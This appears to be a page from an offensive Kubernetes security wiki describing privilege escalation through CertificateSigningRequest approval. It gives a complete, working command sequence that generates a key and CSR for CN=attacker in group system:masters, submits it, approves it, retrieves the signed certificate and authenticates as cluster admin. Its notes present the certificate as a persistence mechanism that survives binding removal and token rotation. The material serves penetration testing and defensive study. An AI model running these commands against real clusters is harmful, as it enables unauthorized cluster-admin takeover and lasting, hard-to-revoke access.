---
title: "CSR approval: minting a privileged client certificate"
description: "The certificates API issues client certificates signed by the cluster CA. An identity that can create a CertificateSigningRequest and approve it, then have it signed, obtains a client certificate for any username and group it chooses, including system:masters, authenticating to the API server as a cluster admin independent of any token or binding."
keywords:
  - certificatesigningrequest
  - csr
  - client certificate
  - system:masters
  - kubernetes ca
---

# CSR approval

Kubernetes can issue client certificates through the certificates API: a `CertificateSigningRequest` carries a CSR whose subject common name becomes the authenticated username and whose organisation fields become groups. If the cluster signer issues it and the identity can both create and approve the request, the attacker receives a certificate for any identity they encode, such as common name `admin` in organisation `system:masters`. That certificate authenticates to the API server directly, with no token and no binding to revoke.

Check the permissions:

```bash
kubectl auth can-i create certificatesigningrequests
kubectl auth can-i update certificatesigningrequests/approval
```

## Mint an admin certificate

```bash
# 1. generate a key and a CSR for CN=attacker, O=system:masters
openssl req -new -newkey rsa:2048 -nodes -keyout k.pem -out c.csr \
  -subj "/CN=attacker/O=system:masters"
# 2. submit it to the kube-apiserver signer
cat <<YAML | kubectl apply -f -
apiVersion: certificates.k8s.io/v1
kind: CertificateSigningRequest
metadata: { name: esc }
spec:
  request: $(base64 -w0 c.csr)
  signerName: kubernetes.io/kube-apiserver-client
  usages: ["client auth"]
YAML
# 3. approve it (needs the approval permission)
kubectl certificate approve esc
# 4. pull the signed certificate and authenticate as system:masters
kubectl get csr esc -o jsonpath='{.status.certificate}' | base64 -d > crt.pem
kubectl --client-certificate=crt.pem --client-key=k.pem \
  --server=$APISERVER --insecure-skip-tls-verify auth can-i '*' '*'
```

## Exploitation notes

- The common name becomes the username and each organisation becomes a group, so `O=system:masters` yields a cluster-admin certificate through the default binding.
- Both create and approve are needed; some clusters auto-approve certain signers, in which case create alone suffices. The `kubernetes.io/kube-apiserver-client` signer is the one that produces API-client certs.
- A signed client certificate is durable: it is not revoked by deleting a binding or rotating a token, so it is also a persistence mechanism until the CA is rotated or the cert expires.

## References

- [Kubernetes: certificate signing requests](https://kubernetes.io/docs/reference/access-authn-authz/certificate-signing-requests/)
- [Kubernetes: certificates and CA](https://kubernetes.io/docs/tasks/administer-cluster/certificates/)
- [HackTricks: Kubernetes CSR](https://book.hacktricks.xyz/pentesting-cloud/kubernetes-security/kubernetes-role-based-access-control-rbac)
